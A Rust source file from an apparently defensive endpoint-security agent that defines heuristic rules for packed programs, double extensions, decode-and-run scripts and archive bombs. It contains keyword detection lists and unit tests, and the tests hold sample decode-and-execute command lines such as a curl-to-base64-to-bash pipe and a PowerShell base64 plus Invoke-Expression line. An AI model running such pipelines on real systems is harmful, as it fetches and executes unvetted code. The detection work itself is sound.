//! Heuristic rules over file features rather than signatures. They catch what no feed has
//! yet, at the price of false positives, so all of them ship in audit mode (recorded, not
//! alerted) until fleet history says otherwise; the server can change a mode like any rule's.

use rmm_content::Confidence;
use rmm_proto::security::{RuleMode, ThreatSeverity};

use crate::exe::{Elf, Pe};
use crate::filetype::FileType;

pub struct Heuristic {
    pub id: &'static str,
    pub name: &'static str,
    pub description: &'static str,
    pub severity: ThreatSeverity,
    pub mitre: &'static [&'static str],
}

pub const PACKED_IN_TEMP: Heuristic = Heuristic {
    id: "RMM-H-0001",
    name: "Unsigned packed program in a temporary or download folder",
    description: "A program with packer section names or a near-random code section, no signature, in a folder where downloads and droppers land.",
    severity: ThreatSeverity::Moderate,
    mitre: &["T1027.002"],
};

pub const DOUBLE_EXTENSION: Heuristic = Heuristic {
    id: "RMM-H-0002",
    name: "Program or script with a double extension",
    description: "Named like a document but runs as code: invoice.pdf.exe, photo.jpg.js.",
    severity: ThreatSeverity::Moderate,
    mitre: &["T1036.007"],
};

pub const DECODE_AND_RUN: Heuristic = Heuristic {
    id: "RMM-H-0003",
    name: "Script that decodes and runs code",
    description: "A script that both decodes data (base64, compression, certutil) and runs code it builds (Invoke-Expression, eval, a shell pipe).",
    severity: ThreatSeverity::Moderate,
    mitre: &["T1027", "T1059"],
};

pub const ARCHIVE_BOMB: Heuristic = Heuristic {
    id: "RMM-H-0004",
    name: "Archive bomb",
    description: "An archive over the scan's limits (nesting, member count, unpacked size or compression ratio): built to exhaust scanners, or just very large.",
    severity: ThreatSeverity::Low,
    mitre: &[],
};

pub const ALL: [&Heuristic; 4] = [&PACKED_IN_TEMP, &DOUBLE_EXTENSION, &DECODE_AND_RUN, &ARCHIVE_BOMB];

pub const CONFIDENCE: Confidence = Confidence::Medium;
pub const MODE: RuleMode = RuleMode::Audit;

fn in_drop_folder(path: &str) -> bool {
    let p = path.replace('\\', "/").to_ascii_lowercase();
    ["/tmp/", "/var/tmp/", "/dev/shm/", "/downloads/", "/appdata/local/temp/", "/windows/temp/", "/appdata/roaming/", "/users/public/", "/.cache/"].iter().any(|d| p.contains(d))
}

const DOCUMENT_EXTENSIONS: &[&str] =
    &["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "rtf", "txt", "jpg", "jpeg", "png", "gif", "bmp", "mp3", "mp4", "avi", "mov", "zip", "rar", "csv", "odt", "html"];
const CODE_EXTENSIONS: &[&str] = &["exe", "scr", "com", "pif", "bat", "cmd", "js", "jse", "vbs", "vbe", "wsf", "hta", "ps1", "lnk", "msi", "jar", "dll", "cpl"];

pub fn double_extension(name: &str) -> bool {
    let base = name.rsplit(['/', '\\']).next().unwrap_or(name).to_ascii_lowercase();
    let parts: Vec<&str> = base.trim_end().split('.').collect();
    let [.., stem, inner, outer] = parts.as_slice() else { return false };
    !stem.is_empty() && DOCUMENT_EXTENSIONS.contains(inner) && CODE_EXTENSIONS.contains(outer)
}

const DECODE: &[&str] = &[
    "frombase64string",
    "base64 -d",
    "base64 --decode",
    "certutil -decode",
    "certutil.exe -decode",
    "atob(",
    "base64_decode(",
    "b64decode(",
    "gzipstream",
    "deflatestream",
    "-encodedcommand",
    "gzinflate(",
    "str_rot13(",
];
const RUN: &[&str] = &[
    "invoke-expression",
    "iex(",
    "iex (",
    "| iex",
    "|iex",
    "eval(",
    "| sh",
    "| bash",
    "|sh",
    "|bash",
    "exec(",
    "execute(",
    "executeglobal",
    ".run(",
    "start-process",
    "system(",
    "assert(",
    "new function(",
    "[reflection.assembly]::load",
];

pub fn decode_and_run(text: &[u8]) -> bool {
    let t = String::from_utf8_lossy(text.get(..text.len().min(4 * 1024 * 1024)).unwrap_or_default()).to_ascii_lowercase();
    DECODE.iter().any(|d| t.contains(d)) && RUN.iter().any(|r| t.contains(r))
}

/// The heuristics that hold. `path` is where the outer file is; `name` the file's or the
/// archive member's own name.
pub fn check(ft: FileType, data: &[u8], pe: Option<&Pe>, elf: Option<&Elf>, path: Option<&str>, name: Option<&str>) -> Vec<&'static Heuristic> {
    let mut out = Vec::new();
    let drop_folder = path.is_some_and(in_drop_folder);
    if drop_folder && (pe.is_some_and(|p| !p.signed && p.looks_packed()) || elf.is_some_and(|e| e.upx)) {
        out.push(&PACKED_IN_TEMP);
    }
    if (ft.is_executable() || ft.is_script() || ft == FileType::Lnk) && name.is_some_and(double_extension) {
        out.push(&DOUBLE_EXTENSION);
    }
    if ft.is_script() && decode_and_run(data) {
        out.push(&DECODE_AND_RUN);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_and_scripts() {
        assert!(double_extension("C:\\Users\\x\\Downloads\\invoice.pdf.exe"));
        assert!(double_extension("photo.JPG.js"));
        assert!(!double_extension("archive.tar.gz") && !double_extension("setup.exe") && !double_extension(".pdf.exe") && !double_extension("v1.2.exe"));
        assert!(decode_and_run(b"$s=[Convert]::FromBase64String($x); IEX([Text.Encoding]::UTF8.GetString($s))"));
        assert!(decode_and_run(b"echo aGk= | base64 -d | sh"));
        assert!(!decode_and_run(b"echo aGk= | base64 -d > out.txt"), "decoding alone is fine");
        assert!(!decode_and_run(b"Invoke-Expression $cmd"), "running alone too");
        let hits = check(FileType::ShellScript, b"curl x | base64 -d | bash", None, None, Some("/tmp/a.sh"), Some("a.sh"));
        assert_eq!(hits.iter().map(|h| h.id).collect::<Vec<_>>(), ["RMM-H-0003"]);
    }

    #[test]
    fn packed_only_counts_in_drop_folders() {
        let packed = Pe { packer: Some("upx"), ..Default::default() };
        let signed = Pe { packer: Some("upx"), signed: true, ..Default::default() };
        let ids = |pe: &Pe, path: &str| check(FileType::Pe, b"", Some(pe), None, Some(path), None).iter().map(|h| h.id).collect::<Vec<_>>();
        assert_eq!(ids(&packed, "C:\\Users\\bob\\Downloads\\tool.exe"), ["RMM-H-0001"]);
        assert!(ids(&packed, "C:\\Program Files\\Tool\\tool.exe").is_empty());
        assert!(ids(&signed, "C:\\Users\\bob\\Downloads\\tool.exe").is_empty(), "signed packers are common in installers");
        let upx = Elf { upx: true, ..Default::default() };
        assert_eq!(check(FileType::Elf, b"", None, Some(&upx), Some("/dev/shm/x"), None).len(), 1);
    }
}
